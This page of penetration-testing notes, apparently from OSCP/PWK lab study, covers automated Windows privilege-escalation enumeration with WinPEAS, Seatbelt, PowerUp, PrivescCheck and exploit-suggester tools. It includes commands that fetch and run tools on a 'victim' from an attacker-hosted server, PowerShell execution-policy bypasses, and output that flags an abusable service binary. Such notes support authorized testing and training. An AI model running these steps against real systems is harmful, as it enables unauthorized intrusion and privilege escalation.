# Automated Enumeration

## WinPEAS

{% code title="On the kali" overflow="wrap" lineNumbers="true" %}
```
sudo apt install peass
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```
{% endcode %}

{% code title="On the victim" overflow="wrap" lineNumbers="true" %}
```
PS:> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> .\winPEASx64.exe > outputfile.exe

```
{% endcode %}

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}

## Seatbelt

{% code title="" overflow="wrap" lineNumbers="true" %}
```
PS:> iwr -uri http://192.168.45.189/Seatbelt.exe -Outfile Seatbelt.exe
./Seatbelt -group=all
```
{% endcode %}

## JAWS

## PowerUp

### PWK2024

{% code title="Import PowerUp.ps1 and execute Get-ModifiableServiceFile" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\dave> powershell -ep bypass
...
PS C:\Users\dave>  . .\PowerUp.ps1

PS C:\Users\dave> Get-ModifiableServiceFile

...

ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
```
{% endcode %}

{% code title="Error from AbuseFunction" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'

Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
modifiable by the current user.
At C:\Users\dave\PowerUp.ps1:2178 char:13
+             throw "Service binary '$($ServiceDetails.PathName)' for s ...
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
   mysql' for service mysql not modifiable by the current user.
```
{% endcode %}

{% code title="Analyzing the function ModifiablePath" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath                IdentityReference Permissions
--------------                ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath     IdentityReference                Permissions
--------------     -----------------                -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 

PS C:\Users\dave> $ModifiableFiles
```
{% endcode %}

### [#powerup.ps1](unquoted-service-path.md#powerup.ps1 "mention")

### Old

PowerUp is a PowerShell script that searches common privilege escalation on the target system. You can run it with the `Invoke-AllChecks` option that will perform all possible checks on the target system or use it to conduct specific checks (e.g. the `Get-UnquotedService` option to only look for potential unquoted service path vulnerabilities).

**Reminder**: To run PowerUp on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can launch PowerShell using the command below.

\


Running PowerUp.ps1 on the Target System

```shell-session
C:\Users\user\Desktop>powershell.exe -nop -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\user\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\user\Desktop> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...
```

\


![](<../../../.gitbook/assets/image (5).png>)

{% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" %}

[PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1)

```
. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended
```

## Windows Exploit Suggester

Update the databases&#x20;

`./windows-exploit-suggester.py --update` &#x20;

To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, windows-exploit-suggester.py can be run as follows;

`./windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt`

A newer version of Windows Exploit Suggester is available [here](https://github.com/bitsadmin/wesng). Depending on the version of the target system, using the newer version could be more efficient.

{% embed url="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" %}

**Metasploit**\



If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
